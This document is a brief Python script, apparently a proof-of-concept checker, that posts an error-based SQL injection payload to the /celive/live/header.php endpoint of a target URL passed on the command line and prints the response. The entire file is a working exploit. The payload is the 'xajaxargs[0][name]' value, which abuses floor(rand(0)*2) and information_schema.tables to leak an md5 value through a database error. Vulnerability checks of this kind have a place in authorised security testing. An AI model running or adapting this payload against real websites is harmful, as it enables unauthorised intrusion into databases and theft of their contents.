# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import sys
import hashlib

def verify(url):
    target = ("%s/celive/live/header.php" % url)
    post_data = {
        "xajax":"LiveMessage",
        "xajaxargs[0][name]":"1',(SELECT 1 FROM (select count(*),concat("
                             "floor(rand(0)*2),(select md5(233)))a from "
                             "information_schema.tables group by a)b),"
                             "'','','','1','127.0.0.1','2') #"
    }
    try:
        req = urllib.request.Request(target, data = urllib.parse.urlencode(post_data).encode("UTF-8"), method= "POST")
        response = urllib.request.urlopen(req)
        if response:
            data = response.read()
            print(str(data, encoding = "utf-8"))
            
    except Exception as e:
        print("Running Wrong...") 
        print(e) 
def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print("Usage: python %s url" % (args[0]))
if __name__ == "__main__":
    main()

